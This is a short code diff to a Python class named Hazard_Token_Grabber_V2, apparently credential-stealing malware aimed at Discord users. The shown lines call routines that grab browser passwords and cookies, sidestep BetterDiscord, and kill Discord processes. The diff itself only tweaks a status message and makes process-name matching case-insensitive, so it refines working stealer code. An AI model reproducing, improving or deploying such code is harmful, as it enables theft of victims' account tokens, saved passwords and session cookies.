@@ -32,7 +32,7 @@ class Hazard_Token_Grabber_V2:
             self.bypass_better_discord()
 
         if not os.path.exists(self.appdata+'\\Google'):
-            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
+            self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
@@ -56,8 +56,8 @@ class Hazard_Token_Grabber_V2:
 
     def LogOut(self):
         for proc in psutil.process_iter():
-            if any(procstr in proc.name() for procstr in\
-            ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
                 proc.kill()
         for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
             for name in dirs:
